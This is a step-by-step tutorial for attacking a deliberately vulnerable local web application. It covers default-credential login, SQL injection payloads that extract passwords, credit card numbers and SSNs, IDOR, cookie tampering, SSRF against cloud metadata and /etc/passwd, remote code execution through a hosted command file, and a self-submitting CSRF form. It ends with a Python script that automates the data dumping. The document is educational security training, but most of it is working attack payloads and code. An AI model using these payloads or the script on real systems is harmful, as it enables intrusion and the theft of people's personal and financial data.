# Web Application Security Testing Tutorial

⚠️ **For Educational Purposes Only** ⚠️

This guide will walk you through the process of testing various security vulnerabilities in a web application. We'll go step by step, explaining what each vulnerability is, how to find it, and how to exploit it.

## Step 1: Initial Reconnaissance

Before we start exploiting vulnerabilities, we need to understand what we're working with. Let's discover what endpoints are available.

### 1.1 Discovering Endpoints

There are three main ways to discover endpoints. Let's try each one:

1. First, visit `/robots.txt`:

   ```
   GET http://localhost:5001/robots.txt
   ```

   This file is meant to tell search engines what not to index, but it often reveals sensitive endpoints. Look at the "Disallow" entries - these are the paths the application doesn't want to be public, which makes them interesting for us!

2. Next, check `/sitemap.xml`:

   ```
   GET http://localhost:5001/sitemap.xml
   ```

   The sitemap shows all public endpoints. Compare these with the robots.txt entries - any differences?

3. Finally, the application has a debug endpoint that lists ALL routes:
   ```
   GET http://localhost:5001/endpoints
   ```
   This gives us the most complete picture, including HTTP methods and parameters.

Take notes of interesting endpoints, especially:

- Admin endpoints (`/admin/...`)
- API endpoints
- Debug endpoints
- Backup/system endpoints

## Step 2: Testing Authentication

Now that we know what endpoints exist, let's try to bypass authentication.

### 2.1 Default Credentials

1. First, try these common credentials:

   ```
   admin:admin123
   admin:password
   admin:admin
   root:root
   test:test
   ```

2. We got lucky! `admin:admin123` works. Always check for default credentials first - it's surprising how often they work.

### 2.2 SQL Injection in Login

The login form is vulnerable to SQL injection. Let's understand how:

1. First, try a simple quote to break the query:

   ```
   Username: admin'
   Password: anything
   ```

   You should see a SQL error. This confirms the vulnerability!

2. Now, let's bypass authentication with a basic SQL injection:

   ```
   Username: admin' OR '1'='1
   Password: anything
   ```

   This works because the SQL query becomes:

   ```sql
   SELECT * FROM user WHERE username='admin' OR '1'='1' AND password='anything'
   ```

   The `OR '1'='1'` makes the WHERE clause always true.

3. Want to login as admin specifically? Try:

   ```
   Username: admin'--
   Password: anything
   ```

   The `--` comments out the password check entirely!

4. Let's extract some data. Try:
   ```
   Username: ' UNION SELECT 'admin','password',1,1,1,1,1,1,1,1--
   Password: password
   ```
   This creates a fake user row through UNION SELECT.

## Step 3: Information Gathering

Now that we're in, let's gather some sensitive information.

### 3.1 User Enumeration

1. Visit the search page and try a simple SQL injection:

   ```
   ' OR '1'='1
   ```

   This lists all users!

2. Want more specific data? Try:

   ```sql
   ' UNION SELECT sql,name,type FROM sqlite_master WHERE type='table'--
   ```

   This shows the database schema!

3. Now we know the table structure, let's get sensitive data:
   ```sql
   ' UNION SELECT credit_card,ssn,password FROM user--
   ```

### 3.2 Direct Object References (IDOR)

The application has a vulnerable profile view system:

1. Visit your profile:

   ```
   GET /profile/your_username
   ```

2. Now try accessing another user's profile by changing the username:

   ```
   GET /profile/admin
   GET /profile/john.doe
   ```

   No authentication check!

3. Even better, visit the backup endpoint:
   ```
   GET /backup
   ```
   This dumps ALL user data!

## Step 4: Session Attacks

The application has several session-related vulnerabilities.

### 4.1 Cookie Manipulation

1. Login as a normal user and check your cookies. You'll see:

   ```
   is_admin=false
   current_user=your_username
   ```

2. Using your browser's developer tools, change these to:

   ```
   is_admin=true
   current_user=admin
   ```

3. Refresh the page - you now have admin access!

### 4.2 Session Fixation

1. Get a session ID before logging in:

   ```
   GET /fixation-login
   ```

   Note your session cookie.

2. Login through `/fixation-login`
   The session ID stays the same - this is the vulnerability!

## Step 5: Server-Side Request Forgery (SSRF)

The application has two SSRF vulnerabilities. Let's test them:

### 5.1 Basic SSRF

1. Try the website checker:

   ```
   GET /check-website?url=http://localhost:22
   ```

   This scans for SSH!

2. Try accessing AWS metadata:

   ```
   GET /check-website?url=http://169.254.169.254/latest/meta-data
   ```

   This could expose cloud credentials!

3. Read local files:
   ```
   GET /check-website?url=file:///etc/passwd
   ```

### 5.2 Avatar SSRF

The avatar fetcher has similar vulnerabilities:

```
GET /fetch-avatar?url=file:///etc/passwd
GET /fetch-avatar?url=http://localhost:22
```

## Step 6: Remote Code Execution

The update mechanism is vulnerable to RCE:

1. Create a malicious JSON file:

   ```json
   {
     "version": "2.0",
     "commands": ["id", "whoami", "cat /etc/passwd"]
   }
   ```

2. Host it somewhere (or use a request bin service)

3. Submit the update:

   ```
   POST /apply-update
   Content-Type: application/x-www-form-urlencoded

   update_url=http://your-server/malicious.json
   ```

## Step 7: Cross-Site Request Forgery (CSRF)

The password reset functionality has no CSRF protection:

1. Create `csrf.html`:

   ```html
   <form
     id="csrf"
     action="http://localhost:5001/admin/reset-password"
     method="POST"
   >
     <input type="hidden" name="username" value="admin" />
     <input type="hidden" name="password" value="hacked" />
   </form>
   <script>
     document.getElementById("csrf").submit();
   </script>
   ```

2. When an admin visits this page, their password will be reset!

## Step 8: Debug Information Exposure

The application exposes detailed error information:

1. Cause a SQL error:

   ```
   GET /search?q='
   ```

2. Get a debug traceback:

   ```
   GET /debug-test
   ```

3. Try a nonexistent page:
   ```
   GET /nonexistent
   ```

Each error reveals implementation details!

## Step 9: Automation Script

Here's a Python script to automate your testing:

```python
import requests
import json

class SecurityTester:
    def __init__(self, base_url="http://localhost:5001"):
        self.base_url = base_url
        self.session = requests.Session()

    def login(self, username="admin", password="admin123"):
        """Login to the application"""
        r = self.session.post(f"{self.base_url}/login", data={
            "username": username,
            "password": password
        })
        return "dashboard" in r.text

    def dump_users(self):
        """Dump all user data through SQL injection"""
        payload = "' UNION SELECT username,password,email,full_name,address,phone,credit_card,ssn,date_of_birth FROM user--"
        r = self.session.get(f"{self.base_url}/search", params={"q": payload})
        return r.json()

    def test_ssrf(self):
        """Test SSRF vulnerabilities"""
        targets = [
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data",
            "file:///etc/passwd"
        ]
        results = []
        for target in targets:
            r = self.session.get(f"{self.base_url}/check-website", params={"url": target})
            results.append(r.json())
        return results

    def get_backup(self):
        """Get complete backup of user data"""
        return self.session.get(f"{self.base_url}/backup").json()

def main():
    tester = SecurityTester()

    print("1. Testing login...")
    if tester.login():
        print("✓ Successfully logged in as admin")

    print("\n2. Dumping users through SQL injection...")
    users = tester.dump_users()
    print(f"✓ Found {len(users)} users")

    print("\n3. Testing SSRF...")
    ssrf_results = tester.test_ssrf()
    print("✓ SSRF tests completed")

    print("\n4. Getting backup...")
    backup = tester.get_backup()
    print(f"✓ Retrieved data for {len(backup['users'])} users")

    # Save results
    with open("security_test_results.json", "w") as f:
        json.dump({
            "users": users,
            "ssrf_tests": ssrf_results,
            "backup": backup
        }, f, indent=2)

    print("\nResults saved to security_test_results.json")

if __name__ == "__main__":
    main()
```

## Security Notice

This tutorial is for educational purposes only. The vulnerabilities demonstrated here should never be used against real systems without explicit permission. Always:

1. Only test systems you own or have permission to test
2. Never use these techniques against production systems
3. Report vulnerabilities responsibly
4. Use your knowledge ethically

Remember: With great power comes great responsibility!
